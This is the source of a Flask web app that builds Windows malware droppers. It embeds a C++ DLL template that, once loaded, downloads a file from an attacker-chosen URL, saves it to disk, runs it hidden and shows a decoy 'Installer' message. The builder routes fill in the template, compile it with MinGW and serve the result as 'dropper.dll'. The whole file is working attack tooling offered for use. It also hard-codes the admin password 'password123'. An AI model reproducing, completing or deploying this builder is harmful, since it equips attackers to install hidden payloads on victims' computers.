from flask import Flask, request, send_file, render_template, session, redirect, url_for
import os
import tempfile
import subprocess
import random
import string

app = Flask(__name__)
app.secret_key = os.urandom(24)

USERS = {"admin": "password123"}

TEMPLATE = """#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

void ExecuteHidden(const char* path) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    char cmd[MAX_PATH*2];
    sprintf_s(cmd, sizeof(cmd), "\\"%s\\"", path);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void ShowMsg(const char* msg) {
    if (msg && strlen(msg) > 0) {
        MessageBoxA(NULL, msg, "Installer", MB_OK);
    }
}

void DoMagic() {
    char path[MAX_PATH];
    sprintf_s(path, sizeof(path), "%s\\\\%s", "{{SAVE_PATH}}", "{{FILE_NAME}}");
    
    const char* url = "{{URL}}";
    
    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return;
    
    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        return;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BYTE buf[4096];
        DWORD read, total = 0;
        while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
            DWORD written;
            WriteFile(hFile, buf, read, &written, NULL);
            total += written;
        }
        CloseHandle(hFile);
        if (total > 10000) {
            ExecuteHidden(path);
            ShowMsg("{{MESSAGE}}");
        }
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        HANDLE t = CreateThread(NULL, 0, [](LPVOID)->DWORD { DoMagic(); return 0; }, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
"""

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('builder.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in USERS and USERS[username] == password:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return "Invalid credentials", 401
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/build', methods=['POST'])
def build():
    if not session.get('logged_in'):
        return "Unauthorized", 401

    url = request.form.get('url')
    save_path = request.form.get('save_path')
    message = request.form.get('message', '').strip()
    custom_filename = request.form.get('custom_filename', '')

    if custom_filename:
        filename = custom_filename if custom_filename.endswith('.dll') else custom_filename + '.dll'
    else:
        filename = f"lib{random_string(12)}.dll"

    # Заменяем плейсхолдеры
    code = TEMPLATE.replace("{{SAVE_PATH}}", save_path)
    code = code.replace("{{FILE_NAME}}", filename)
    code = code.replace("{{URL}}", url)
    code = code.replace("{{MESSAGE}}", message)

    # Создаём временную папку
    tmp_dir = "/tmp/build"
    os.makedirs(tmp_dir, exist_ok=True)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False, dir=tmp_dir) as f:
        f.write(code)
        cpp_path = f.name

    out_dll = cpp_path.replace('.cpp', '.dll')
    
    # Компиляция через MinGW
    compile_cmd = [
        'x86_64-w64-mingw32-g++', '-O2', '-s', '-static', '-shared',
        '-D_WIN32_WINNT=0x0600',
        '-o', out_dll, cpp_path,
        '-lwininet', '-lws2_32'
    ]
    
    try:
        subprocess.run(compile_cmd, check=True, capture_output=True, text=True)
    except Exception as e:
        return f"Compilation failed: {e}", 500

    return send_file(out_dll, as_attachment=True, download_name="dropper.dll")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
